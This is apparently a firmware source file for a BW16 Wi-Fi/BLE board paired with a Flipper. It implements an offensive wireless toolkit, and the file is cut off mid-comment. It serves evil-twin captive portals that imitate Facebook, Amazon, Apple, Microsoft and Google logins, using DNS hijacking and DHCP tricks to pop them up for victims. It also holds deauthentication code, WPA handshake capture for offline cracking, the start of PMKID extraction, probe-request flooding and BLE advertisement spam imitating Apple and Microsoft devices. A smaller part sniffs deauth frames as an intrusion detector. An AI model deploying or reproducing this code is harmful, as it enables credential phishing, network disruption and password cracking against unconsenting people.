#include "vector"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"
#include <BLEDevice.h>
#include <BLEAdvertData.h>
#include <BLEHIDDevice.h>
#include <BLEHIDKeyboard.h>

//Captive portals
#include "portals/compressed/facebook.h"
#include "portals/compressed/amazon.h"
#include "portals/compressed/apple.h"
#include "portals/compressed/microsoft.h"
#include "portals/compressed/google.h"
#include "portals/default.h"

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple,
  Microsoft,
  Google,
  Custom
};


//DNS

#include "dns.h"
#include "dhcp_captive.h"
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>

// Stop the SDK's built-in DHCP server (in lib_arduino.a) so our option-114 server
// can own UDP:67. Declared here to avoid pulling the whole dhcps.h.
extern "C" void dhcps_deinit(void);

#define MIN(a, b) ((a) < (b) ? (a) : (b))

#define BAUD 115200

//PORTALS




typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;


const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};

// BEACONSPAM GHOST: a rotating set of "ghost"-flavoured SSIDs (5Ghost's Ghost AP Beacon).
static const char* ghost_ssids[8] = {
      "5Ghost", "Ghost_AP", "Free WiFi", "PINGEQUA",
      "GhostNet", "FreeWifi", "Ghost AP", "Connect"
};


std::vector<WiFiScanResult> scan_results;
volatile bool scan_done = false;  // set by scanResultHandler when the driver reports completion
std::vector<int> deauth_wifis, wifis_temp;
//WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID, rickroll, ghostSpam;
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal=0;
int localPortNew=1000;
char wpa_pass[64];
char ap_channel[4];
bool secured=false;
//"00:E0:4C:01:02:03"
__u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac=false;
// Captive-portal host: a NAME derived from the AP SSID ("Free_Wifi" -> freewifi.com) so
// the portal is served as http://<host>/ instead of a bare IP. The DNS hijack resolves
// <host> (and every other name) to the AP, so DHCP option 114, the 302 Location and
// /cp.json all advertise this host.
char portalHost[64] = "portal.com";
char portalUrl[80]  = "http://portal.com/";
char cpUri[96]      = "http://portal.com/cp.json";

void build_portal_urls(const char* ssid){
  char s[48]; int n = 0;
  for (int i = 0; ssid && ssid[i] && n < 47; i++) {
    char c = ssid[i];
    if (c >= '0' && c <= '9')      s[n++] = c;
    else if (c >= 'a' && c <= 'z') s[n++] = c;
    else if (c >= 'A' && c <= 'Z') s[n++] = (char)(c - 'A' + 'a');
    // drop spaces, underscores, dots and anything else that is not [a-z0-9]
  }
  s[n] = 0;
  if (n == 0) strcpy(s, "portal");
  snprintf(portalHost, sizeof(portalHost), "%s.com", s);
  snprintf(portalUrl,  sizeof(portalUrl),  "http://%s/", portalHost);
  snprintf(cpUri,      sizeof(cpUri),      "http://%s/cp.json", portalHost);
  Serial.print("PORTAL host: "); Serial.println(portalHost);
}
//int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
extern u8 rtw_get_band_type(void);
#define FRAMES_PER_DEAUTH 5

// DFS (radar) 5GHz channels: RX-only, never TX deauth here (5Ghost does the same).
static bool is_dfs_channel(int ch) {
  return (ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144);
}

static int hexnib(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

//DNS
bool apActive = false;

// Custom portal: HTML streamed from the Flipper (SD file) via PORTALHTML hex chunks.
static char customPortal[8192];
static volatile uint16_t customPortalLen = 0;


int status = WL_IDLE_STATUS;   

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete != 0) {
    scan_done = true;   // driver signalled completion -> all results are in
    return RTW_SUCCESS;
  }
  {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    if(result.ssid.length()==0)result.ssid = String("<empty>");
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    
    memcpy(&result.bssid, &record->BSSID, 6);
    // (no bssid_str here: it pointed at a local -> dangling. The LIST output formats the
    //  MAC itself with %02X, so the pointer was never needed.)
    result.security = record->security;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
WiFiServer server(80);
bool serveBegined =false;


void createAP(char* ssid, char* channel, char* password){
  int mode;
  const char* ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);


  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  while (status != WL_CONNECTED) {
    DEBUG_SER_PRINT("CREATING AP 2");
      if(strcmp(password,"")==0){
        status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
      }else{
        status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
      }
      delay(1000);
  }
  // Replace the SDK DHCP server with ours so we can advertise option 114 (RFC 8910),
  // which is what actually triggers Android 11+ captive-portal auto-open.
  dhcps_deinit();
  start_DHCP_Server(cpUri);

  unbind_dns();
  delay(1000);

  //Creamos un nuevo servicio de dns
  start_DNS_Server();
  if(!serveBegined){
    server.begin();
    serveBegined=true;
  }
  apActive = true;
  ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);
}
void createAP(char* ssid, char* channel){

  createAP(ssid, channel, "");
}
void destroyAP(){
  // Tear our own servers down BEFORE the wifi_off/wifi_on below, while lwip is still
  // alive (calling udp_remove on a pcb freed by the re-init would be a use-after-free).
  // Without this the 2nd+ AP start of a session is broken:
  //  - the HTTP listen socket dies with the WiFi re-init, but serveBegined stays true,
  //    so server.begin() is never called again -> every accept() fails -> no portal.
  //  - start_DHCP_Server() early-returns on dhcp_pcb != NULL, so retarget_ap_netif()
  //    is skipped -> AP sits on the driver default subnet while DHCP advertises
  //    192.168.4.1 -> client has no reachable gateway (and option 114's /cp.json
  //    is unreachable, so Android never auto-opens the portal).
  stop_DHCP_Server();     // dhcp_pcb = NULL -> next start_DHCP_Server() retargets + rebinds
  serveBegined = false;   // -> next createAP() re-opens the HTTP listen socket
  delay(500);
  WiFiClient client = server.available();
  while(client.connected()){
    DEBUG_SER_PRINT("PArando cliente");
    DEBUG_SER_PRINT(client);
    client.flush();
    client.stop();
    client = server.available();
  }
  apActive=false;
  delay(500);
  wifi_off();
  delay(500);
  WiFiDrv::wifiDriverInit();
  wifi_on(RTW_MODE_STA_AP);
  status = WL_IDLE_STATUS;   
  delay(500);
  WiFi.enableConcurrent();

  WiFi.status();
  int channel;
  wifi_get_channel(&channel);



}


String makeResponse(int code, String content_type, bool compresed, size_t content_length) {
  // Well-formed HTTP is required: Android/iOS captive detection ignores malformed
  // responses (bare LF, no Content-Length). CRLF + Content-Length mirrors stock 5Ghost.
  const char *reason = (code == 302) ? "Found" : (code == 404) ? "Not Found" : "OK";
  String response = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
  if(compresed)
  response += "Content-Encoding: gzip\r\n";
  response += "Content-Type: " + content_type + "\r\n";
  response += "Content-Length: " + String(content_length) + "\r\n";
  response += "Cache-Control: no-store\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

// 302 to the portal root — this is what makes Android's generate_204 / iOS probes fire the
// "Sign in to network" flow. Stock 5Ghost uses exactly this; DHCP option 114 is NOT needed.
void handleRedirect(WiFiClient &client) {
  String response = "HTTP/1.1 302 Found\r\n";
  response += "Location: " + String(portalUrl) + "\r\n";
  response += "Content-Length: 0\r\n";
  response += "Cache-Control: no-store\r\n";
  response += "Connection: close\r\n\r\n";
  client.write(response.c_str());
}

// Per-client captive state: once a client submits the portal form it's "authorized",
// and we answer ITS OS connectivity probes with 204 (No Content) so the
// "Connected, no internet" warning clears. Un-authorized clients still get a 302 to
// the portal, so it keeps popping for new victims. Peer IP via WiFiClient::remoteIP()
// (core patch -> lwip_getpeername).
static uint32_t authed_ips[16];
static uint8_t authed_n = 0;
bool ip_is_authed(uint32_t ip) { for (uint8_t i = 0; i < authed_n; i++) if (authed_ips[i] == ip) return true; return false; }
void ip_mark_authed(uint32_t ip) { if (ip && !ip_is_authed(ip)) { authed_ips[authed_n % 16] = ip; if (authed_n < 16) authed_n++; } }

void handle204(WiFiClient &client) {
  // 204 = probe succeeded -> OS marks the network validated and drops the warning.
  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n");
}

void handle404(WiFiClient &client) {
  String body = "Not found!";
  String response = makeResponse(404, "text/plain", false, body.length());
  response += body;
  client.write(response.c_str());
}


void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
  const char *webPage;
  size_t len;
  bool compresed = false;
  switch(portalType){
    case Default:
      webPage = default_web(ssid);
      len = strlen(webPage);
      break;
    case Facebook:
      webPage = (const char*)facebook;
      len = facebook_len;
      break;
    case Amazon:
      webPage = (const char*)amazon;
      len = amazon_len;
      break;
    case Apple:
      webPage = (const char *)apple;
      len = apple_len;
      break;
    case Google:
      webPage = (const char *)google;
      len = google_len;
      break;
    case Microsoft:
      webPage = (const char *)microsoft;
      len = microsoft_len;
      break;
    case Custom:
      webPage = customPortal;
      len = customPortalLen;
      break;
    default:
      webPage = default_web(ssid);
  }
  Serial.print("Heap libre header:");
  Serial.println(xPortGetFreeHeapSize());
  if(webPage[0]==0x1f && webPage[1]==0x8b){
    compresed=true;
  }
  
  String response = makeResponse(200, "text/html", compresed, len);
  client.write(response.c_str());
  
   

  size_t chunkSize = 5000;

  for (size_t i = 0; i < len; i += chunkSize) {
        size_t sendSize = MIN(chunkSize, len - i);
        while(client.available()){
            client.read();
            delay(10);
            }
            Serial.print("Heap libre write:");
        Serial.println(xPortGetFreeHeapSize());
        if(client.connected()){
          client.write((const uint8_t *)(webPage + i), sendSize);
          if(client.getWriteError())return;
        }else{
          return;
        }
        delay(1);
  }

  delay(10);
   while(client.available()){
            client.read();
            delay(1);
            }
}

int scanNetworks(int miliseconds) {
  DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
  scan_results.clear();
  scan_done = false;
  DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
  DEBUG_SER_PRINT("scan results cleared...");
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    digitalWrite(LED_B,false);
    // Wait for the DRIVER's completion signal (scan_done), not a fixed delay: the scan
    // routinely takes longer than `miliseconds`, and a premature SCAN:OK made the host's
    // immediately-following LIST race the results -> empty/partial list.
    uint32_t t0 = millis();
    uint32_t maxwait = (uint32_t)miliseconds + 5000u;
    while (!scan_done && (millis() - t0) < maxwait) {
      digitalWrite(LED_G, !digitalRead(LED_G));
      delay(100);
    }
    digitalWrite(LED_B,true);
    DEBUG_SER_PRINT(" done! n="+(String)scan_results.size()+"\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String readString;

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  Serial.begin(BAUD);
  Serial1.begin(BAUD);
  readString.reserve(50);
  DEBUG_SER_PRINT("Iniciando\n");
  
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);

  digitalWrite(LED_B, HIGH);
}
String ssid="";
uint32_t current_num = 0;

// --- Promisc spike (GATE test): does the BW16 driver actually deliver data/EAPOL
// frames to the promisc callback, or only mgmt? If data+EAPOL flow, handshake/PMKID/
// station-enum ports are feasible; if not, they're off the table. RTW_PROMISC_ENABLE
// + len_used=1 delivers Ethernet frames, so EAPOL shows up as ethertype 0x888e. ---
static volatile uint32_t pm_total = 0, pm_mgmt = 0, pm_ctrl = 0, pm_data = 0, pm_eapol = 0;

// --- P5: WPA 4-way handshake capture -------------------------------------------
// When `hs_cap` is set, every EAPOL (802.1X) data frame seen on the monitored channel
// is copied verbatim (full 802.11 header, no FCS) into a small RAM ring. After the
// capture window we stream the raw frames over Serial/Serial1 as `HSFRAME:<hex>` lines
// so the host can rebuild a LINKTYPE_IEEE802_11 pcap (see firmware-build/hs_to_pcap.py).
// Gate result proving this is viable: ch2 -> total=1208 mgmt=750 data=458 eapol=0
// (data/metrics flow; eapol=0 only because no full 4-way occurred in the passive window).
#define HS_MAX 12          // frames kept per capture (a full 4-way is 4)
#define HS_FRAME_MAX 256   // per-frame byte cap
static volatile bool hs_cap = false;
static volatile uint16_t hs_count = 0;
static uint8_t hs_frames[HS_MAX][HS_FRAME_MAX];
static uint16_t hs_lens[HS_MAX];

// RTW_PROMISC_ENABLE_2 (raw 802.11): buf[0] = frame control. type bits (buf[0]>>2)&3:
// 0=mgmt 1=ctrl 2=data. EAPOL rides in a data frame after the 802.11 hdr + LLC/SNAP,
// ethertype 0x888e at offset 30 (non-QoS) or 32 (QoS data).
static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (len < 1) return;
  pm_total++;
  uint8_t ftype = (buf[0] >> 2) & 0x3;
  if (ftype == 0) pm_mgmt++;
  else if (ftype == 1) pm_ctrl++;
  else if (ftype == 2) {
    pm_data++;
    if ((len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) ||
        (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e)) {
      pm_eapol++;
      // Keep the whole frame (M1..M4) for offline cracking. memcpy only — this runs in
      // the driver/WiFi task, so no String/heap work here.
      if (hs_cap && hs_count < HS_MAX) {
        uint16_t n = (len < HS_FRAME_MAX) ? (uint16_t)len : (uint16_t)HS_FRAME_MAX;
        memcpy(hs_frames[hs_count], buf, n);
        hs_lens[hs_count] = n;
        hs_count++;
      }
    }
  }
}

// Dump the captured EAPOL frames as hex lines the host tool turns into a .pcap.
static void hs_stream(int ch) {
  uint16_t n = hs_count;
  String hdr = "HSCAP: ch=" + String(ch) + " count=" + String((unsigned)n);
  Serial.println(hdr); Serial1.println(hdr);
  for (uint16_t i = 0; i < n; i++) {
    String line = "HSFRAME:";
    line.reserve(2 * hs_lens[i] + 12);
    for (uint16_t j = 0; j < hs_lens[i]; j++) {
      char b[3];
      snprintf(b, sizeof(b), "%02x", hs_frames[i][j]);
      line += b;
    }
    Serial.println(line); Serial1.println(line);
  }
  String fin = "HSDONE:" + String((unsigned)n);
  Serial.println(fin); Serial1.println(fin);
}

// --- P1: channel hop ---
static volatile bool hopping = false;
static volatile uint32_t hop_interval_ms = 500;
static const uint8_t hop_channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};

// --- P2: PMF/WPA3 classification from the RSN IE of beacons / probe responses ---
// The scan API (rtw_scan_result_t, wifi_structures.h) exposes only a coarse security
// bitmask, so 802.11w MFP required/capable and SAE must be read from the RSN IE
// (tag 48). We harvest it from promisc and report per-BSSID. RSN capabilities bits:
// B6 = MFPR (required), B7 = MFPC (capable). AKM suite type 8 = SAE, 9 = FT-SAE.
#define PMF_MAX_APS 16
typedef struct {
  uint8_t bssid[6];
  char ssid[33];
  uint16_t caps;  // RSN capabilities
  uint8_t sae;    // SAE / FT-SAE present
  uint8_t n_akm;
} pmf_ap_t;
static pmf_ap_t pmf_aps[PMF_MAX_APS];
static volatile uint8_t pmf_n = 0;

static void pmf_parse(const uint8_t* f, unsigned len) {
  if (len < 36) return;
  uint8_t st = (f[0] >> 4) & 0xF;
  if (st != 8 && st != 5) return;           // beacon / probe response only
  const uint8_t* bssid = f + 16;            // addr3 == BSSID
  char ssid[33];
  ssid[0] = 0;
  uint16_t rcaps = 0;
  int have_rsn = 0, sae = 0, nakm = 0;
  unsigned i = 36;                          // 24-byte mgmt hdr + 12-byte fixed params
  while (i + 2 <= len) {
    uint8_t id = f[i], l = f[i + 1];
    unsigned d = i + 2;
    if (d + l > len) break;
    if (id == 0) {                          // SSID
      uint8_t n = l < 32 ? l : 32;
      memcpy(ssid, f + d, n);
      ssid[n] = 0;
    } else if (id == 48 && l >= 8) {        // RSN IE
      unsigned p = d + 2;                   // skip version
      p += 4;                               // group cipher suite
      if (p + 2 <= d + l) {
        uint16_t pc = f[p] | (f[p + 1] << 8);
        p += 2 + 4 * (unsigned)pc;          // pairwise count + suites
      }
      if (p + 2 <= d + l) {
        uint16_t ac = f[p] | (f[p + 1] << 8);
        p += 2;
        for (int k = 0; k < ac && p + 4 <= d + l; k++, p += 4) {
          uint8_t t = f[p + 3];
          if (t == 8 || t == 9) sae = 1;
          nakm++;
        }
      }
      if (p + 2 <= d + l) rcaps = f[p] | (f[p + 1] << 8);
      have_rsn = 1;
    }
    i = d + l;
  }
  if (!have_rsn) return;
  for (uint8_t k = 0; k < pmf_n; k++)
    if (!memcmp(pmf_aps[k].bssid, bssid, 6)) return;   // already seen
  if (pmf_n >= PMF_MAX_APS) return;
  pmf_ap_t* a = &pmf_aps[pmf_n];
  memcpy(a->bssid, bssid, 6);
  memcpy(a->ssid, ssid, sizeof(a->ssid));
  a->caps = rcaps;
  a->sae = sae;
  a->n_akm = nakm;
  pmf_n++;
}

static void promisc_pmf_cb(unsigned char* buf, unsigned int len, void* userdata) {
  (void)userdata;
  pmf_parse(buf, len);
}

static void pmf_stream(int ch) {
  for (uint8_t k = 0; k < pmf_n; k++) {
    pmf_ap_t* a = &pmf_aps[k];
    const char* mfp = (a->caps & 0x0040) ? "req" : (a->caps & 0x0080) ? "cap" : "no";
    char line[128];
    snprintf(line, sizeof(line),
      "PMF:%02X:%02X:%02X:%02X:%02X:%02X|%s|akm=%u|sae=%u|mfp=%s",
      a->bssid[0], a->bssid[1], a->bssid[2], a->bssid[3], a->bssid[4], a->bssid[5],
      a->ssid, (unsigned)a->n_akm, (unsigned)a->sae, mfp);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "PMFDONE: ch=" + String(ch) + " aps=" + String((unsigned)pmf_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- P4: STASCAN — enumerate stations associated to a BSSID from promisc ------
// No RSSI here: the promisc callback only gets (buf, len) — the driver strips the
// radiotap header — so we report MAC + frame count only.
#define STA_MAX 24
typedef struct { uint8_t mac[6]; uint16_t count; } sta_t;
static sta_t sta_list[STA_MAX];
static volatile uint8_t sta_n = 0;
static uint8_t sta_filter[6];
static volatile bool sta_filter_on = false;

static void sta_add(const uint8_t* mac) {
  for (uint8_t i = 0; i < sta_n; i++)
    if (!memcmp(sta_list[i].mac, mac, 6)) { sta_list[i].count++; return; }
  if (sta_n >= STA_MAX) return;
  memcpy(sta_list[sta_n].mac, mac, 6);
  sta_list[sta_n].count = 1;
  sta_n++;
}

static void promisc_sta_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if (len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t st = (buf[0] >> 4) & 0xF;
  uint8_t tods = buf[1] & 0x01, fromds = (buf[1] >> 1) & 0x01;
  const uint8_t *a1 = buf + 4, *a2 = buf + 10, *a3 = buf + 16;
  const uint8_t* sta = NULL;
  if (ftype == 2) {                                    // data
    if (tods && !fromds) { if (sta_filter_on && memcmp(a1, sta_filter, 6)) return; sta = a2; }
    else if (!tods && fromds) { if (sta_filter_on && memcmp(a2, sta_filter, 6)) return; sta = a1; }
    else return;                                       // IBSS / WDS — ambiguous
  } else if (ftype == 0) {                             // mgmt: auth(11)/assoc-req(0)/reassoc-req(2)
    if (st != 11 && st != 0 && st != 2) return;
    if (sta_filter_on && memcmp(a3, sta_filter, 6)) return;
    sta = a2;
  } else return;
  if (sta && !(sta[0] & 0x01)) sta_add(sta);           // skip multicast/broadcast
}

static void sta_stream(int ch) {
  for (uint8_t i = 0; i < sta_n; i++) {
    char line[64];
    snprintf(line, sizeof(line), "STA:%02X:%02X:%02X:%02X:%02X:%02X|%u",
      sta_list[i].mac[0], sta_list[i].mac[1], sta_list[i].mac[2],
      sta_list[i].mac[3], sta_list[i].mac[4], sta_list[i].mac[5],
      (unsigned)sta_list[i].count);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "STADONE: ch=" + String(ch) + " n=" + String((unsigned)sta_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- A1: probe-request sniffer / PNL extraction --------------------------------
// Devices broadcast probe requests naming the SSIDs they remember (their Preferred
// Network List). We log each sender's MAC + the requested SSID(s) so the Flipper can build
// a "known networks" inventory (recon / audit). Directed probes carry the SSID; wildcard
// probes reveal only the client. RSSI is not delivered to the promisc callback.
#define PROBE_MAX 12
typedef struct { uint8_t mac[6]; uint8_t n; char ssid[2][33]; } probe_t;
static probe_t probes[PROBE_MAX];
static uint8_t probe_n = 0;

static void probe_add(const uint8_t* mac, const char* ssid) {
  int idx = -1;
  for(uint8_t i = 0; i < probe_n; i++)
    if(!memcmp(probes[i].mac, mac, 6)) { idx = i; break; }
  if(idx < 0) {
    if(probe_n >= PROBE_MAX) return;
    idx = probe_n++;
    memcpy(probes[idx].mac, mac, 6);
    probes[idx].n = 0;
  }
  if(ssid && ssid[0]) {
    for(uint8_t k = 0; k < probes[idx].n; k++)
      if(!strcmp(probes[idx].ssid[k], ssid)) return;
    if(probes[idx].n < 2) {
      strncpy(probes[idx].ssid[probes[idx].n], ssid, 32);
      probes[idx].ssid[probes[idx].n][32] = 0;
      probes[idx].n++;
    }
  }
}

static void promisc_probe_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t stype = (buf[0] >> 4) & 0xF;
  if(ftype != 0 || stype != 4) return;          // mgmt, probe request only
  const uint8_t* src = buf + 10;                // addr2
  if(src[0] & 0x01) return;                     // multicast/broadcast sender — skip
  char ssid[33]; ssid[0] = 0;
  unsigned int p = 24;
  while(p + 2 <= len) {
    uint8_t id = buf[p], il = buf[p + 1];
    if(p + 2 + il > len) break;
    if(id == 0) {                               // SSID IE
      int n = il > 32 ? 32 : il;
      memcpy(ssid, buf + p + 2, n);
      ssid[n] = 0;
      break;
    }
    p += 2 + il;
  }
  probe_add(src, ssid);
}

static void probe_stream(int ch) {
  for(uint8_t i = 0; i < probe_n; i++) {
    char line[160];
    int n = snprintf(line, sizeof(line), "PROBE:%02X:%02X:%02X:%02X:%02X:%02X|",
      probes[i].mac[0], probes[i].mac[1], probes[i].mac[2],
      probes[i].mac[3], probes[i].mac[4], probes[i].mac[5]);
    if(probes[i].n == 0) {
      n += snprintf(line + n, sizeof(line) - n, "*");
    } else {
      for(uint8_t k = 0; k < probes[i].n; k++)
        n += snprintf(line + n, sizeof(line) - n, "%s%s", k ? "," : "", probes[i].ssid[k]);
    }
    Serial.println(line); Serial1.println(line);
  }
  String fin = "PROBEDONE: ch=" + String(ch) + " n=" + String((unsigned)probe_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- B7: probe-request flood (raw probe request frames) -------------------------
static void tx_probe_req(const uint8_t* src, const char* ssid) {
  uint8_t f[128]; int n = 0;
  f[n++] = 0x40; f[n++] = 0x00;                 // frame control: probe request
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr1 broadcast
  for(int i = 0; i < 6; i++) f[n++] = src[i];   // addr2 src
  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr3 bssid
  f[n++] = 0x00; f[n++] = 0x00;                 // seq
  int sl = ssid ? (int)strlen(ssid) : 0;
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID element
  for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
  f[n++] = 0x01; f[n++] = 0x04;                 // supported rates IE
  f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
  wifi_tx_raw_frame(f, n);
}

// --- D2: BLE advert spam (Apple continuity + Microsoft Swift Pair) ---------------
// Packet layouts from https://github.com/Flipper-XFW/Xtreme-Apps ble_spam protocols.
static uint8_t blespam_pkt(uint8_t* p, uint8_t type) {
  if(type == 3) {   // Microsoft Swift Pair
    static const char* names[] = {"Flipper", "Windows", "SwiftPair", "BT-Device"};
    const char* nm = names[random(0, 4)];
    uint8_t nl = (uint8_t)strlen(nm);
    if(nl > 20) nl = 20;
    p[0] = (uint8_t)(6 + nl); p[1] = 0xFF; p[2] = 0x06; p[3] = 0x00;
    p[4] = 0x03; p[5] = 0x00; p[6] = 0x80;
    memcpy(p + 7, nm, nl);
    return (uint8_t)(7 + nl);
  }
  if(type == 1) {   // Apple Nearby Action ("Setup New iPhone", "Join This AppleTV?", ...)
    static const uint8_t actions[] = {0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B};
    p[0] = 10; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x0F; p[5] = 5;
    p[6] = 0xC0;
    p[7] = actions[random(0, 12)];
    for(int i = 0; i < 3; i++) p[8 + i] = (uint8_t)random(0, 256);
    return 11;
  }
  if(type == 2) {   // Apple AirDrop
    p[0] = 23; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x05; p[5] = 18;
    for(int i = 6; i < 14; i++) p[i] = 0x00;
    p[14] = 0x01;
    for(int i = 15; i < 23; i++) p[i] = (uint8_t)random(0, 256);
    return 24;
  }
  // default: Apple Proximity Pair (AirPods / AirTag / Beats ...)
  static const uint16_t models[] = {0x0E20,0x0A20,0x0055,0x0220,0x0F20,0x1320,
                                    0x1420,0x1020,0x0620,0x0320,0x0B20,0x0520};
  uint16_t m = models[random(0, 12)];
  p[0] = 30; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x07; p[5] = 25;
  p[6] = (m == 0x0055) ? 0x05 : 0x07;          // airtag -> 0x05, else "new device"
  p[7] = (uint8_t)((m >> 8) & 0xFF);
  p[8] = (uint8_t)(m & 0xFF);
  p[9] = 0x55;
  p[10] = (uint8_t)((random(0, 10) << 4) + random(0, 10));
  p[11] = (uint8_t)((random(0, 8) << 4) + random(0, 10));
  p[12] = (uint8_t)random(0, 256);
  p[13] = 0x00;
  p[14] = 0x00;
  for(int i = 15; i < 31; i++) p[i] = (uint8_t)random(0, 256);
  return 31;
}

// --- A5: deauth/disassoc sniffer (IDS) ------------------------------------------
// Flags other people's deauth attacks: counts deauth(0x0C)/disassoc(0x0A) frames per
// (src,dst,reason) so the host can list who is knocking whom off, and why.
#define IDS_MAX 16
typedef struct { uint8_t src[6], dst[6]; uint8_t reason; uint16_t count; } ids_t;
static ids_t ids[IDS_MAX];
static uint8_t ids_n = 0;

static void ids_add(const uint8_t* src, const uint8_t* dst, uint8_t reason) {
  for(uint8_t i = 0; i < ids_n; i++)
    if(!memcmp(ids[i].src, src, 6) && !memcmp(ids[i].dst, dst, 6) && ids[i].reason == reason) {
      ids[i].count++;
      return;
    }
  if(ids_n >= IDS_MAX) return;
  memcpy(ids[ids_n].src, src, 6);
  memcpy(ids[ids_n].dst, dst, 6);
  ids[ids_n].reason = reason;
  ids[ids_n].count = 1;
  ids_n++;
}

static void promisc_ids_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(len < 26) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t stype = (buf[0] >> 4) & 0xF;
  if(ftype != 0) return;
  if(stype != 0x0C && stype != 0x0A) return;   // deauth / disassoc
  ids_add(buf + 10 /*addr2 src*/, buf + 4 /*addr1 dst*/, buf[24]);
}

static void ids_stream(int ch) {
  for(uint8_t i = 0; i < ids_n; i++) {
    char line[96];
    snprintf(line, sizeof(line),
      "DEAUTH:%02X:%02X:%02X:%02X:%02X:%02X>%02X:%02X:%02X:%02X:%02X:%02X|r%u|x%u",
      ids[i].src[0], ids[i].src[1], ids[i].src[2], ids[i].src[3], ids[i].src[4], ids[i].src[5],
      ids[i].dst[0], ids[i].dst[1], ids[i].dst[2], ids[i].dst[3], ids[i].dst[4], ids[i].dst[5],
      (unsigned)ids[i].reason, (unsigned)ids[i].count);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "DEAUTHDONE: ch=" + String(ch) + " n=" + String((unsigned)ids_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- P6: PMKID extraction from EAPOL-Key M1 ----------------------------------
// Clientless PMKID: many WPA2 APs put the PMKID in the RSN key-data KDE of the very
// first EAPOL-Key (M1). We identify M1 (key info ACK set, MIC clear, RSN descriptor)
